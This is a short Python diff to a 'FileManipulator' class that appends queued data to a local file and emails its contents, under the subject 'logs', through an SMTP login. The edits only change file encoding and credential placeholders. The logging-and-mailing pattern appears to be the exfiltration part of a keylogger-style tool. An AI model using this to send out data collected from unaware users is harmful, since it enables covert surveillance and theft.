@@ -18,7 +18,7 @@ class FileManipulator:
     @staticmethod
     def write_queue():
         with f_lock:
-            f = open("demofile.txt", "a")
+            f = open("demofile.txt", "a", encoding="utf-8")
 
             global send_overwrite
             while send_overwrite != 1:
@@ -39,8 +39,8 @@ class FileManipulator:
     def make_message(cls, content):
         msg = EmailMessage()
         msg['Subject'] = f'logs ~ {datetime.now()}'
-        msg['From'] = 'EMAIL HERE'
-        msg['To'] = 'EMAIL HERE'
+        msg['From'] = 'YOUR EMAIL HERE'
+        msg['To'] = 'YOUR EMAIL HERE'
         msg.set_content(content)
         return msg
 
@@ -61,7 +61,7 @@ class FileManipulator:
             message = FileManipulator.make_message(f.read())
             f.close()
             # Authentication
-            s.login(message['From'], "YOUR PASSWORD")
+            s.login(message['From'], "APP PASSWORD HERE")
             #send the mail
             s.sendmail(message["From"], message["To"], message.as_string())
 
